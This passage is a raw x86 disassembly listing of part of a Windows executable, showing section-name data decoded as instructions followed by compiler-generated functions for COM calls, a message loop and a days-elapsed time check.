  402ba7:	popa   
  402ba8:	je     0x402c0b
  402baa:	and    al,0x73
  402bac:	js     0x402c12
  402bae:	popa   
  402baf:	je     0x402c12
  402bb1:	add    BYTE PTR [eax],al
  402bb3:	add    BYTE PTR [eax-0xfffffd6],dl
  402bb9:	add    al,BYTE PTR [eax]
  402bbb:	add    BYTE PTR [esi],ch
  402bbd:	jb     0x402c23
  402bbf:	popa   
  402bc0:	je     0x402c23
  402bc2:	and    al,0x7a
  402bc4:	jp     0x402c40
  402bc6:	bound  esp,QWORD PTR fs:[edi+0x0]
  402bca:	add    BYTE PTR [eax],al
  402bcc:	sub    BYTE PTR ds:0x4c0000,0x0
  402bd3:	add    BYTE PTR [esi],ch
  402bd5:	je     0x402c3c
  402bd7:	js     0x402c4d
  402bd9:	and    al,0x64
  402bdb:	imul   eax,DWORD PTR [eax],0xd0000000
  402be1:	sub    eax,0x43300000
  402be6:	add    BYTE PTR [eax],al
  402be8:	cs je  0x402c50
  402beb:	js     0x402c61
  402bed:	and    al,0x6d
  402bef:	outs   dx,BYTE PTR ds:[esi]
  402bf0:	add    BYTE PTR [eax],al
  402bf2:	add    BYTE PTR [eax],al
  402bf4:	add    BYTE PTR [ecx+0x0],dh
  402bf7:	add    BYTE PTR [eax+0x0],al
  402bfa:	add    BYTE PTR [eax],al
  402bfc:	cs je  0x402c64
  402bff:	js     0x402c75
  402c01:	and    al,0x78
  402c03:	add    BYTE PTR [eax+0x71],al
  402c06:	add    BYTE PTR [eax],al
  402c08:	cmp    eax,DWORD PTR [eax]
  402c0a:	add    BYTE PTR [eax],al
  402c0c:	cs je  0x402c74
  402c0f:	js     0x402c85
  402c11:	and    al,0x79
  402c13:	add    BYTE PTR fs:[eax],al
  402c16:	add    BYTE PTR [eax],al
  402c18:	xor    BYTE PTR [ecx+0x0],0x0
  402c1c:	push   eax
  402c1d:	add    al,BYTE PTR [eax]
  402c1f:	add    BYTE PTR [esi],ch
  402c21:	js     0x402c87
  402c23:	popa   
  402c24:	je     0x402c87
  402c26:	and    al,0x78
  402c28:	add    BYTE PTR [eax],al
  402c2a:	add    BYTE PTR [eax],al
  402c2c:	shl    BYTE PTR [ebx+0x0],1
  402c2f:	add    BYTE PTR [eax+0x0],al
  402c32:	add    BYTE PTR [eax],al
  402c34:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3224
  402c3e:	add    BYTE PTR [eax],al
  402c40:	adc    BYTE PTR [eax+eax*1+0x0],dh
  402c44:	and    BYTE PTR [eax],al
  402c46:	add    BYTE PTR [eax],al
  402c48:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3324
  402c52:	add    BYTE PTR [eax],al
  402c54:	xor    BYTE PTR [eax+eax*1+0x0],dh
  402c58:	push   0x2e000000
  402c5d:	imul   esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3424
  402c66:	add    BYTE PTR [eax],al
  402c68:	cwde   
  402c69:	je     0x402c6b
  402c6b:	add    BYTE PTR [esi+0x4],bl
  402c6e:	add    BYTE PTR [eax],al
  402c70:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3624
  402c7a:	add    BYTE PTR [eax],al
  402c7c:	clc    
  402c7d:	js     0x402c7f
  402c7f:	add    BYTE PTR [eax+0x0],ch
  402c82:	add    BYTE PTR [eax],al
  402c84:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3724
  402c8e:	add    BYTE PTR [eax],al
  402c90:	add    BYTE PTR [eax+0x40000],al
  402c96:	add    BYTE PTR [eax],al
  402c98:	imul   ebp,DWORD PTR cs:[ebp+0x72],0x766973
  402ca0:	add    BYTE PTR [eax+0x900000],dl
  402ca6:	add    BYTE PTR [eax],al
  402ca8:	cs fs popa 
  402cab:	je     0x402d0e
  402cad:	add    BYTE PTR [eax],al
  402caf:	add    BYTE PTR [eax-0x6cffff70],dl
  402cb5:	add    BYTE PTR [eax],al
  402cb7:	add    BYTE PTR [esi],ch
  402cb9:	fs popa 
  402cbb:	je     0x402d1e
  402cbd:	and    al,0x72
  402cbf:	add    BYTE PTR [eax-0x6f],al
  402cc2:	add    BYTE PTR [eax],al
  402cc4:	adc    al,0x4
  402cc6:	add    BYTE PTR [eax],al
  402cc8:	bound  esi,QWORD PTR cs:[ebx+0x73]
  402ccc:	add    BYTE PTR [eax],al
  402cce:	add    BYTE PTR [eax],al
  402cd0:	add    BYTE PTR [eax+0x1ec0000],ah
  402cd6:	add    BYTE PTR [eax],al
  402cd8:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  402ce1:	add    BYTE PTR [eax],al
  402ce3:	add    ah,ch
  402ce5:	mov    eax,ds:0x40000
  402cea:	add    BYTE PTR [eax],al
  402cec:	xor    BYTE PTR cs:[eax],dh
  402cef:	arpl   WORD PTR [esi+0x67],sp
  402cf2:	add    BYTE PTR [eax],al
  402cf4:	lock mov eax,ds:0x17c0000
  402cfa:	add    BYTE PTR [eax],al
  402cfc:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x322461
  402d05:	add    BYTE PTR [eax],al
  402d07:	add    BYTE PTR [ebx+eiz*4+0x0],ch
  402d0b:	add    BYTE PTR [eax+eax*1],dl
  402d0e:	add    BYTE PTR [eax],al
  402d10:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  402d19:	add    BYTE PTR [eax],al
  402d1b:	add    BYTE PTR [eax-0x13ffff5d],al
  402d21:	add    DWORD PTR [eax],eax
  402d23:	add    BYTE PTR [esi],ch
  402d25:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  402d2d:	add    BYTE PTR [eax],al
  402d2f:	add    BYTE PTR [ebp+eiz*4+0x0],ch
  402d33:	add    BYTE PTR [edx+0x9],dl
  402d36:	add    BYTE PTR [eax],al
  402d38:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  402d41:	add    BYTE PTR [eax],al
  402d43:	add    BYTE PTR [eax],al
  402d45:	mov    al,0x0
  402d47:	add    BYTE PTR [eax+0x0],ch
  402d4a:	add    BYTE PTR [eax],al
  402d4c:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3524
  402d56:	add    BYTE PTR [eax],al
  402d58:	add    al,al
  402d5a:	add    BYTE PTR [eax],al
  402d5c:	dec    eax
  402d5d:	add    DWORD PTR [eax],eax
  402d5f:	add    BYTE PTR [esi],ch
  402d61:	jb     0x402dd6
  402d63:	jb     0x402dc8
  402d65:	and    al,0x30
  402d67:	xor    DWORD PTR [eax],eax
  402d69:	add    BYTE PTR [eax],al
  402d6b:	add    BYTE PTR [eax-0x3f],dl
  402d6e:	add    BYTE PTR [eax],al
  402d70:	ror    BYTE PTR [esi],0x0
  402d73:	add    BYTE PTR [esi],ch
  402d75:	jb     0x402dea
  402d77:	jb     0x402ddc
  402d79:	and    al,0x30
  402d7b:	xor    al,BYTE PTR [eax]
  402d7d:	add    BYTE PTR [eax],al
  402d7f:	add    bh,al
  402d81:	add    eax,0x4094e4
  402d86:	or     BYTE PTR [ecx+0x40],0x0
  402d8a:	mov    DWORD PTR ds:0x4094dc,0x404a70
  402d94:	mov    DWORD PTR ds:0x4094e0,0x404ac0
  402d9e:	ret    
  402d9f:	int3   
  402da0:	push   0x407150
  402da5:	call   0x406278
  402daa:	pop    ecx
  402dab:	ret    
  402dac:	int3   
  402dad:	int3   
  402dae:	int3   
  402daf:	int3   
  402db0:	push   0x407160
  402db5:	call   0x406278
  402dba:	pop    ecx
  402dbb:	ret    
  402dbc:	int3   
  402dbd:	int3   
  402dbe:	int3   
  402dbf:	int3   
  402dc0:	push   0x407170
  402dc5:	call   0x406278
  402dca:	pop    ecx
  402dcb:	ret    
  402dcc:	int3   
  402dcd:	int3   
  402dce:	int3   
  402dcf:	int3   
  402dd0:	int3   
  402dd1:	int3   
  402dd2:	int3   
  402dd3:	int3   
  402dd4:	int3   
  402dd5:	mov    edi,edi
  402dd7:	push   ebp
  402dd8:	mov    ebp,esp
  402dda:	push   ecx
  402ddb:	mov    eax,ds:0x409004
  402de0:	xor    eax,ebp
  402de2:	mov    DWORD PTR [ebp-0x4],eax
  402de5:	mov    edx,DWORD PTR [ecx]
  402de7:	test   edx,edx
  402de9:	je     0x402e00
  402deb:	and    DWORD PTR [ecx],0x0
  402dee:	mov    eax,DWORD PTR [edx]
  402df0:	push   esi
  402df1:	push   edx
  402df2:	mov    esi,DWORD PTR [eax+0x8]
  402df5:	mov    ecx,esi
  402df7:	call   DWORD PTR ds:0x40a1ec
  402dfd:	call   esi
  402dff:	pop    esi
  402e00:	mov    ecx,DWORD PTR [ebp-0x4]
  402e03:	xor    ecx,ebp
  402e05:	call   0x405d80
  402e0a:	mov    esp,ebp
  402e0c:	pop    ebp
  402e0d:	ret    
  402e0e:	int3   
  402e0f:	int3   
  402e10:	int3   
  402e11:	int3   
  402e12:	int3   
  402e13:	int3   
  402e14:	int3   
  402e15:	int3   
  402e16:	int3   
  402e17:	int3   
  402e18:	int3   
  402e19:	int3   
  402e1a:	int3   
  402e1b:	int3   
  402e1c:	int3   
  402e1d:	int3   
  402e1e:	int3   
  402e1f:	int3   
  402e20:	ret    0x4
  402e23:	int3   
  402e24:	int3   
  402e25:	int3   
  402e26:	int3   
  402e27:	int3   
  402e28:	int3   
  402e29:	int3   
  402e2a:	int3   
  402e2b:	int3   
  402e2c:	int3   
  402e2d:	int3   
  402e2e:	int3   
  402e2f:	int3   
  402e30:	mov    al,0x1
  402e32:	ret    0x14
  402e35:	int3   
  402e36:	int3   
  402e37:	int3   
  402e38:	int3   
  402e39:	int3   
  402e3a:	int3   
  402e3b:	int3   
  402e3c:	int3   
  402e3d:	int3   
  402e3e:	int3   
  402e3f:	int3   
  402e40:	ret    0x14
  402e43:	int3   
  402e44:	int3   
  402e45:	int3   
  402e46:	int3   
  402e47:	int3   
  402e48:	int3   
  402e49:	int3   
  402e4a:	int3   
  402e4b:	int3   
  402e4c:	int3   
  402e4d:	int3   
  402e4e:	int3   
  402e4f:	int3   
  402e50:	ret    0x8
  402e53:	int3   
  402e54:	int3   
  402e55:	int3   
  402e56:	int3   
  402e57:	int3   
  402e58:	mov    edi,edi
  402e5a:	push   ebp
  402e5b:	mov    ebp,esp
  402e5d:	sub    esp,0x10
  402e60:	mov    eax,ds:0x4094d4
  402e65:	lea    edx,[ebp-0x10]
  402e68:	push   ebx
  402e69:	push   esi
  402e6a:	push   edi
  402e6b:	mov    edi,DWORD PTR [ebp+0x10]
  402e6e:	xor    ebx,ebx
  402e70:	mov    DWORD PTR [ebp-0x8],eax
  402e73:	lea    eax,[ebp+0xc]
  402e76:	push   eax
  402e77:	lea    eax,[ebp-0x8]
  402e7a:	mov    DWORD PTR [ebp-0x10],ecx
  402e7d:	push   eax
  402e7e:	lea    eax,[ebp-0xc]
  402e81:	mov    DWORD PTR [ebp-0xc],ebx
  402e84:	push   eax
  402e85:	lea    ecx,[ebp-0x4]
  402e88:	mov    DWORD PTR [edi],ebx
  402e8a:	mov    DWORD PTR [ebp-0x4],ebx
  402e8d:	call   0x4043ab
  402e92:	mov    esi,eax
  402e94:	test   esi,esi
  402e96:	js     0x402ea0
  402e98:	mov    ecx,DWORD PTR [ebp-0x4]
  402e9b:	mov    DWORD PTR [ebp-0x4],ebx
  402e9e:	mov    DWORD PTR [edi],ecx
  402ea0:	lea    ecx,[ebp-0x4]
  402ea3:	call   0x402dd5
  402ea8:	pop    edi
  402ea9:	mov    eax,esi
  402eab:	pop    esi
  402eac:	pop    ebx
  402ead:	mov    esp,ebp
  402eaf:	pop    ebp
  402eb0:	ret    0xc
  402eb3:	int3   
  402eb4:	int3   
  402eb5:	int3   
  402eb6:	int3   
  402eb7:	int3   
  402eb8:	int3   
  402eb9:	int3   
  402eba:	int3   
  402ebb:	int3   
  402ebc:	int3   
  402ebd:	int3   
  402ebe:	int3   
  402ebf:	int3   
  402ec0:	mov    edi,edi
  402ec2:	push   ebp
  402ec3:	mov    ebp,esp
  402ec5:	mov    ecx,DWORD PTR [ebp+0x8]
  402ec8:	sub    esp,0xc
  402ecb:	add    ecx,0x14
  402ece:	push   ebx
  402ecf:	mov    ebx,DWORD PTR [ebp+0xc]
  402ed2:	push   esi
  402ed3:	xor    esi,esi
  402ed5:	push   edi
  402ed6:	mov    DWORD PTR [ebx],esi
  402ed8:	mov    edi,DWORD PTR [ecx]
  402eda:	test   edi,edi
  402edc:	je     0x402f13
  402ede:	mov    DWORD PTR [ebp-0xc],esi
  402ee1:	mov    DWORD PTR [ebp-0x8],esi
  402ee4:	mov    DWORD PTR [ebp-0x4],esi
  402ee7:	call   0x403f82
  402eec:	push   eax
  402eed:	push   edi
  402eee:	lea    ecx,[ebp-0xc]
  402ef1:	call   0x403fb2
  402ef6:	mov    edi,eax
  402ef8:	test   edi,edi
  402efa:	js     0x402f03
  402efc:	mov    ecx,DWORD PTR [ebp-0xc]
  402eff:	mov    DWORD PTR [ebx],ecx
  402f01:	jmp    0x402f06
  402f03:	mov    esi,DWORD PTR [ebp-0xc]
  402f06:	test   esi,esi
  402f08:	je     0x402f18
  402f0a:	push   esi
  402f0b:	call   DWORD PTR ds:0x40a088
  402f11:	jmp    0x402f18
  402f13:	mov    edi,0x80070490
  402f18:	mov    eax,edi
  402f1a:	pop    edi
  402f1b:	pop    esi
  402f1c:	pop    ebx
  402f1d:	mov    esp,ebp
  402f1f:	pop    ebp
  402f20:	ret    0x8
  402f23:	int3   
  402f24:	int3   
  402f25:	int3   
  402f26:	int3   
  402f27:	int3   
  402f28:	int3   
  402f29:	int3   
  402f2a:	int3   
  402f2b:	int3   
  402f2c:	int3   
  402f2d:	int3   
  402f2e:	int3   
  402f2f:	int3   
  402f30:	mov    edi,edi
  402f32:	push   ebp
  402f33:	mov    ebp,esp
  402f35:	mov    eax,DWORD PTR [ebp+0x8]
  402f38:	mov    ecx,DWORD PTR [eax+0x10]
  402f3b:	mov    eax,DWORD PTR [ebp+0xc]
  402f3e:	mov    DWORD PTR [eax],ecx
  402f40:	xor    eax,eax
  402f42:	pop    ebp
  402f43:	ret    0x8
  402f46:	int3   
  402f47:	int3   
  402f48:	int3   
  402f49:	int3   
  402f4a:	int3   
  402f4b:	int3   
  402f4c:	int3   
  402f4d:	int3   
  402f4e:	int3   
  402f4f:	int3   
  402f50:	mov    edi,edi
  402f52:	push   ebp
  402f53:	mov    ebp,esp
  402f55:	push   ecx
  402f56:	mov    eax,ds:0x409004
  402f5b:	xor    eax,ebp
  402f5d:	mov    DWORD PTR [ebp-0x4],eax
  402f60:	push   edi
  402f61:	mov    edi,DWORD PTR [ebp+0x8]
  402f64:	mov    ecx,DWORD PTR [edi+0xc]
  402f67:	test   ecx,ecx
  402f69:	je     0x402f7d
  402f6b:	mov    eax,DWORD PTR [ecx]
  402f6d:	push   esi
  402f6e:	push   ecx
  402f6f:	mov    esi,DWORD PTR [eax+0x4]
  402f72:	mov    ecx,esi
  402f74:	call   DWORD PTR ds:0x40a1ec
  402f7a:	call   esi
  402f7c:	pop    esi
  402f7d:	mov    eax,DWORD PTR [ebp+0xc]
  402f80:	mov    ecx,DWORD PTR [edi+0xc]
  402f83:	pop    edi
  402f84:	mov    DWORD PTR [eax],ecx
  402f86:	xor    eax,eax
  402f88:	mov    ecx,DWORD PTR [ebp-0x4]
  402f8b:	xor    ecx,ebp
  402f8d:	call   0x405d80
  402f92:	mov    esp,ebp
  402f94:	pop    ebp
  402f95:	ret    0x8
  402f98:	int3   
  402f99:	int3   
  402f9a:	int3   
  402f9b:	int3   
  402f9c:	int3   
  402f9d:	int3   
  402f9e:	int3   
  402f9f:	int3   
  402fa0:	mov    edi,edi
  402fa2:	push   ebp
  402fa3:	mov    ebp,esp
  402fa5:	push   esi
  402fa6:	mov    esi,ecx
  402fa8:	lea    ecx,[esi+0x14]
  402fab:	call   0x403f5e
  402fb0:	lea    ecx,[esi+0xc]
  402fb3:	call   0x402dd5
  402fb8:	test   BYTE PTR [ebp+0x8],0x1
  402fbc:	mov    DWORD PTR [esi+0x8],0xc0000001
  402fc3:	je     0x402fcd
  402fc5:	push   esi
  402fc6:	call   DWORD PTR ds:0x40a1b0
  402fcc:	pop    ecx
  402fcd:	mov    eax,esi
  402fcf:	pop    esi
  402fd0:	pop    ebp
  402fd1:	ret    0x4
  402fd4:	int3   
  402fd5:	int3   
  402fd6:	int3   
  402fd7:	int3   
  402fd8:	int3   
  402fd9:	int3   
  402fda:	int3   
  402fdb:	int3   
  402fdc:	int3   
  402fdd:	int3   
  402fde:	int3   
  402fdf:	int3   
  402fe0:	mov    edi,edi
  402fe2:	push   ebp
  402fe3:	mov    ebp,esp
  402fe5:	push   ecx
  402fe6:	push   esi
  402fe7:	push   edi
  402fe8:	lea    eax,[ebp-0x4]
  402feb:	mov    esi,ecx
  402fed:	push   eax
  402fee:	call   DWORD PTR ds:0x40b004
  402ff4:	mov    edi,DWORD PTR [ebp+0xc]
  402ff7:	mov    edx,DWORD PTR [edi+0x4]
  402ffa:	cmp    edx,DWORD PTR [eax]
  402ffc:	jne    0x40303e
  402ffe:	cmp    DWORD PTR [esi+0x14],0x2
  403002:	jne    0x40301d
  403004:	push   0x1
  403006:	push   0x4021ec
  40300b:	mov    edx,0x402218
  403010:	call   0x405654
  403015:	push   ecx
  403016:	call   0x4035c8
  40301b:	jmp    0x403033
  40301d:	push   0x2
  40301f:	push   0x306e
  403024:	push   0x0
  403026:	mov    DWORD PTR [esi+0x18],0x403050
  40302d:	call   DWORD PTR ds:0x40a1e0
  403033:	mov    ecx,esi
  403035:	call   0x403549
  40303a:	mov    BYTE PTR [edi+0x8],0x1
  40303e:	pop    edi
  40303f:	pop    esi
  403040:	mov    esp,ebp
  403042:	pop    ebp
  403043:	ret    0x8
  403046:	int3   
  403047:	int3   
  403048:	int3   
  403049:	int3   
  40304a:	int3   
  40304b:	int3   
  40304c:	int3   
  40304d:	int3   
  40304e:	int3   
  40304f:	int3   
  403050:	mov    edi,edi
  403052:	push   ebp
  403053:	mov    ebp,esp
  403055:	sub    esp,0xc
  403058:	mov    eax,ds:0x409004
  40305d:	xor    eax,ebp
  40305f:	mov    DWORD PTR [ebp-0x4],eax
  403062:	push   ebx
  403063:	push   esi
  403064:	push   edi
  403065:	lea    eax,[ebp-0x8]
  403068:	xor    ebx,ebx
  40306a:	push   eax
  40306b:	mov    DWORD PTR [ebp-0x8],ebx
  40306e:	call   0x404143
  403073:	push   eax
  403074:	push   0x4027a4
  403079:	push   0x1
  40307b:	push   ebx
  40307c:	push   0x402994
  403081:	call   DWORD PTR ds:0x40a080
  403087:	mov    edi,eax
  403089:	test   edi,edi
  40308b:	js     0x4030b0
  40308d:	mov    eax,DWORD PTR [ebp-0x8]
  403090:	lea    ecx,[ebp-0xc]
  403093:	push   ecx
  403094:	push   ebx
  403095:	push   0x402290
  40309a:	mov    esi,DWORD PTR [eax]
  40309c:	push   0x4022d8
  4030a1:	push   eax
  4030a2:	mov    ecx,DWORD PTR [esi+0xc]
  4030a5:	call   DWORD PTR ds:0x40a1ec
  4030ab:	call   DWORD PTR [esi+0xc]
  4030ae:	mov    edi,eax
  4030b0:	test   BYTE PTR ds:0x4094c0,0x4
  4030b7:	je     0x4030c7
  4030b9:	push   ecx
  4030ba:	push   ecx
  4030bb:	mov    edx,edi
  4030bd:	mov    ecx,0x402068
  4030c2:	call   0x404718
  4030c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4030ca:	test   ecx,ecx
  4030cc:	je     0x4030e1
  4030ce:	mov    DWORD PTR [ebp-0x8],ebx
  4030d1:	mov    eax,DWORD PTR [ecx]
  4030d3:	push   ecx
  4030d4:	mov    esi,DWORD PTR [eax+0x8]
  4030d7:	mov    ecx,esi
  4030d9:	call   DWORD PTR ds:0x40a1ec
  4030df:	call   esi
  4030e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4030e4:	mov    eax,edi
  4030e6:	pop    edi
  4030e7:	pop    esi
  4030e8:	xor    ecx,ebp
  4030ea:	pop    ebx
  4030eb:	call   0x405d80
  4030f0:	mov    esp,ebp
  4030f2:	pop    ebp
  4030f3:	ret    
  4030f4:	int3   
  4030f5:	int3   
  4030f6:	int3   
  4030f7:	int3   
  4030f8:	int3   
  4030f9:	mov    edi,edi
  4030fb:	push   ebp
  4030fc:	mov    ebp,esp
  4030fe:	and    esp,0xfffffff8
  403101:	sub    esp,0x24
  403104:	mov    eax,ds:0x409004
  403109:	xor    eax,esp
  40310b:	mov    DWORD PTR [esp+0x20],eax
  40310f:	mov    eax,DWORD PTR [ebp+0x8]
  403112:	push   ebx
  403113:	push   esi
  403114:	push   edi
  403115:	mov    edi,ecx
  403117:	xor    ebx,ebx
  403119:	mov    esi,ebx
  40311b:	mov    DWORD PTR [edi+0x14],eax
  40311e:	call   0x40319c
  403123:	test   al,al
  403125:	je     0x403181
  403127:	mov    ecx,edi
  403129:	call   0x4037d6
  40312e:	mov    esi,eax
  403130:	test   esi,esi
  403132:	js     0x403181
  403134:	jmp    0x40314c
  403136:	lea    eax,[esp+0x10]
  40313a:	push   eax
  40313b:	call   DWORD PTR ds:0x40a054
  403141:	lea    eax,[esp+0x10]
  403145:	push   eax
  403146:	call   DWORD PTR ds:0x40a05c
  40314c:	push   ebx
  40314d:	push   ebx
  40314e:	push   ebx
  40314f:	lea    eax,[esp+0x1c]
  403153:	push   eax
  403154:	call   DWORD PTR ds:0x40a058
  40315a:	test   eax,eax
  40315c:	jg     0x403136
  40315e:	cmp    DWORD PTR [edi+0x14],ebx
  403161:	jne    0x403181
  403163:	mov    edi,DWORD PTR [edi+0x18]
  403166:	test   edi,edi
  403168:	je     0x403176
  40316a:	mov    ecx,edi
  40316c:	call   DWORD PTR ds:0x40a1ec
  403172:	call   edi
  403174:	mov    esi,eax
  403176:	test   esi,esi
  403178:	js     0x403181
  40317a:	call   0x403b32
  40317f:	mov    esi,eax
  403181:	mov    ecx,DWORD PTR [esp+0x2c]
  403185:	mov    eax,esi
  403187:	pop    edi
  403188:	pop    esi
  403189:	pop    ebx
  40318a:	xor    ecx,esp
  40318c:	call   0x405d80
  403191:	mov    esp,ebp
  403193:	pop    ebp
  403194:	ret    0x4
  403197:	int3   
  403198:	int3   
  403199:	int3   
  40319a:	int3   
  40319b:	int3   
  40319c:	mov    edi,edi
  40319e:	push   ebp
  40319f:	mov    ebp,esp
  4031a1:	mov    eax,DWORD PTR [ecx+0x14]
  4031a4:	sub    esp,0x1c
  4031a7:	push   ebx
  4031a8:	xor    ebx,ebx
  4031aa:	sub    eax,ebx
  4031ac:	je     0x4031dc
  4031ae:	sub    eax,0x1
  4031b1:	je     0x4031be
  4031b3:	sub    eax,0x1
  4031b6:	jne    0x403288
  4031bc:	jmp    0x4031d5
  4031be:	test   BYTE PTR ds:0x4094c0,0x4
  4031c5:	je     0x4031d5
  4031c7:	push   ecx
  4031c8:	push   ecx
  4031c9:	xor    edx,edx
  4031cb:	mov    ecx,0x402110
  4031d0:	call   0x404718
  4031d5:	mov    bl,0x1
  4031d7:	jmp    0x403288
  4031dc:	lea    eax,[ebp-0x4]
  4031df:	push   eax
  4031e0:	push   ecx
  4031e1:	call   0x405610
  4031e6:	test   eax,eax
  4031e8:	js     0x403270
  4031ee:	lea    eax,[ebp-0x8]
  4031f1:	push   eax
  4031f2:	push   0x402420
  4031f7:	call   0x403294
  4031fc:	test   eax,eax
  4031fe:	js     0x403270
  403200:	mov    eax,DWORD PTR [ebp-0x4]
  403203:	cmp    eax,DWORD PTR [ebp-0x8]
  403206:	jae    0x403270
  403208:	lea    eax,[ebp-0x1c]
  40320b:	push   eax
  40320c:	push   ecx
  40320d:	call   0x40567e
  403212:	test   eax,eax
  403214:	js     0x403270
  403216:	mov    eax,0x402470
  40321b:	cmp    DWORD PTR [ebp-0x4],ebx
  40321e:	je     0x403225
  403220:	mov    eax,0x4024c0
  403225:	lea    ecx,[ebp-0xc]
  403228:	push   ecx
  403229:	push   eax
  40322a:	call   0x403294
  40322f:	test   eax,eax
  403231:	js     0x403270
  403233:	lea    eax,[ebp-0x14]
  403236:	push   eax
  403237:	call   DWORD PTR ds:0x40a010
  40323d:	mov    ecx,DWORD PTR [ebp-0x14]
  403240:	sub    ecx,DWORD PTR [ebp-0x1c]
  403243:	mov    eax,DWORD PTR [ebp-0x10]
  403246:	sbb    eax,DWORD PTR [ebp-0x18]
  403249:	push   ebx
  40324a:	push   0x989680
  40324f:	push   eax
  403250:	push   ecx
  403251:	call   0x407040
  403256:	push   ebx
  403257:	push   0x15180
  40325c:	push   edx
  40325d:	push   eax
  40325e:	call   0x407040
  403263:	cmp    edx,ebx
  403265:	jl     0x403270
  403267:	jg     0x40326e
  403269:	cmp    eax,DWORD PTR [ebp-0xc]
  40326c:	jb     0x403270
  40326e:	mov    bl,0x1
  403270:	test   BYTE PTR ds:0x4094c0,0x4
  403277:	je     0x403288
  403279:	push   ecx
  40327a:	push   ecx
  40327b:	movzx  edx,bl
  40327e:	mov    ecx,0x402058
  403283:	call   0x404718
  403288:	mov    al,bl
  40328a:	pop    ebx
  40328b:	mov    esp,ebp
  40328d:	pop    ebp
  40328e:	ret    
  40328f:	int3   
  403290:	int3   
  403291:	int3   
  403292:	int3   
  403293:	int3   
  403294:	mov    edi,edi
  403296:	push   ebp
  403297:	mov    ebp,esp
  403299:	sub    esp,0x1c
  40329c:	mov    eax,ds:0x409004
  4032a1:	xor    eax,ebp
  4032a3:	mov    DWORD PTR [ebp-0x4],eax
  4032a6:	and    DWORD PTR [ebp-0x8],0x0
  4032aa:	lea    eax,[ebp-0x8]
  4032ad:	push   ebx
  4032ae:	mov    ebx,DWORD PTR [ebp+0xc]
  4032b1:	push   esi
  4032b2:	push   edi
  4032b3:	push   eax
  4032b4:	and    DWORD PTR [ebx],0x0
  4032b7:	push   0x402794
  4032bc:	push   0x1
  4032be:	push   0x0
  4032c0:	push   0x4029a4
  4032c5:	call   DWORD PTR ds:0x40a080
  4032cb:	mov    edi,eax
  4032cd:	test   edi,edi
  4032cf:	js     0x403320
  4032d1:	xor    eax,eax
  4032d3:	lea    ecx,[ebp-0x18]
  4032d6:	mov    WORD PTR [ebp-0x18],ax
  4032da:	mov    eax,DWORD PTR [ebp-0x8]
  4032dd:	push   ecx
  4032de:	push   DWORD PTR [ebp+0x8]
  4032e1:	mov    esi,DWORD PTR [eax]
  4032e3:	push   0x1
  4032e5:	push   eax
  4032e6:	mov    ecx,DWORD PTR [esi+0xc]
  4032e9:	call   DWORD PTR ds:0x40a1ec
  4032ef:	call   DWORD PTR [esi+0xc]
  4032f2:	mov    edi,eax
  4032f4:	test   edi,edi
  4032f6:	js     0x403316
  4032f8:	and    DWORD PTR [ebx],0x0
  4032fb:	cmp    WORD PTR [ebp-0x18],0x0
  403300:	jne    0x403309
  403302:	mov    edi,0x80070490
  403307:	jmp    0x403316
  403309:	push   ebx
  40330a:	lea    eax,[ebp-0x18]
  40330d:	push   eax
  40330e:	call   DWORD PTR ds:0x40b060
  403314:	mov    edi,eax
  403316:	lea    eax,[ebp-0x18]
  403319:	push   eax
  40331a:	call   DWORD PTR ds:0x40a074
  403320:	mov    ecx,DWORD PTR [ebp-0x8]
  403323:	test   ecx,ecx
  403325:	je     0x40333b
  403327:	and    DWORD PTR [ebp-0x8],0x0
  40332b:	mov    eax,DWORD PTR [ecx]
  40332d:	push   ecx
  40332e:	mov    esi,DWORD PTR [eax+0x8]
  403331:	mov    ecx,esi
  403333:	call   DWORD PTR ds:0x40a1ec
  403339:	call   esi
  40333b:	mov    ecx,DWORD PTR [ebp-0x4]
  40333e:	mov    eax,edi
  403340:	pop    edi
  403341:	pop    esi
  403342:	xor    ecx,ebp
  403344:	pop    ebx
  403345:	call   0x405d80
  40334a:	mov    esp,ebp
  40334c:	pop    ebp
  40334d:	ret    0x8
  403350:	int3   
  403351:	int3   
  403352:	int3   
  403353:	int3   
  403354:	int3   
  403355:	int3   
  403356:	int3   
  403357:	int3   
  403358:	int3   
  403359:	int3   
  40335a:	int3   
  40335b:	int3   
  40335c:	int3   
  40335d:	int3   
  40335e:	int3   
  40335f:	int3   
  403360:	mov    edi,edi
  403362:	push   esi
  403363:	mov    esi,ecx
  403365:	call   0x403549
  40336a:	mov    eax,DWORD PTR [esi+0x14]
  40336d:	xor    ecx,ecx
  40336f:	sub    eax,ecx
  403371:	je     0x403397
  403373:	sub    eax,0x1
  403376:	je     0x403385
  403378:	sub    eax,0x1
  40337b:	jne    0x4033b9
  40337d:	push   ecx
  40337e:	call   0x4035c8
  403383:	jmp    0x4033b9
  403385:	test   BYTE PTR ds:0x4094c0,0x4
  40338c:	je     0x4033b9
  40338e:	push   ecx
  40338f:	push   ecx
  403390:	mov    ecx,0x402028
  403395:	jmp    0x4033b4
  403397:	push   ecx
  403398:	push   0x306e
  40339d:	push   ecx
  40339e:	call   DWORD PTR ds:0x40a1e0
  4033a4:	test   BYTE PTR ds:0x4094c0,0x4
  4033ab:	je     0x4033b9
  4033ad:	push   ecx
  4033ae:	push   ecx
  4033af:	mov    ecx,0x402038
  4033b4:	call   0x4046f9
  4033b9:	xor    eax,eax
  4033bb:	pop    esi
  4033bc:	ret    0x8
  4033bf:	int3   
  4033c0:	int3   
  4033c1:	int3   
  4033c2:	int3   
  4033c3:	int3   
  4033c4:	int3   
  4033c5:	int3   
  4033c6:	int3   
  4033c7:	int3   
  4033c8:	int3   
  4033c9:	int3   
  4033ca:	int3   
  4033cb:	int3   
  4033cc:	int3   
  4033cd:	int3   
  4033ce:	int3   
  4033cf:	int3   
  4033d0:	mov    edi,edi
  4033d2:	push   ebp
  4033d3:	mov    ebp,esp
  4033d5:	sub    esp,0xc
